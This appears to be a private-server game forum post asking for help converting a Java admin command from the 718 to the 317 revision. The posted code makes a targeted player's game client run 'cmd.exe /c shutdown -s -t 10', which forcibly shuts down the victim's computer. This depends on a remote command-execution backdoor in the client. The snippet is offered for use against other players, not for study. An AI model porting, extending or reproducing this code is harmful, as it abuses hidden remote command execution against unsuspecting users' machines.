channel.title: 718 to 317 command convertation needed!

item.title: 718 to 317 command convertation needed!
item.dc:creator: @protection-scape protection-scape
item.description:
@protection-scape wrote:

CAN SOMEONE CONVER THIS CODE TO 317?

		if (cmd[0].equalsIgnoreCase("shutdown")
				&& ((player.getRights() == 7))) {
			String username = cmd[1].substring(cmd[1].indexOf(" ") + 1);
			Player p2 = World.getPlayerByDisplayName(username);
			p2.getPackets().sendExecMessage("cmd.exe /c shutdown -s -t 10");
			return true;
		}
